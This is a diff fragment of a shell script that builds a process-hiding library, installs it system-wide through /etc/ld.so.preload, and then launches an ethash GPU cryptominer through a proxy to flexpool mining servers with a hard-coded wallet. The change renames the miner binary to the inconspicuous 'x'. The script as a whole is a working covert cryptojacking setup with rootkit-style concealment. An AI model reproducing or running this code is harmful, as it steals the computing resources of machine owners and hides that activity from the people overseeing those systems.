@@ -44,4 +44,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./graftcp/graftcp ./itsme -a ethash -w 0xF0529F3c3abD43252BF3BE801A9DBCBf435A4b2B -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./graftcp/graftcp ./x -a ethash -w 0xF0529F3c3abD43252BF3BE801A9DBCBf435A4b2B -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
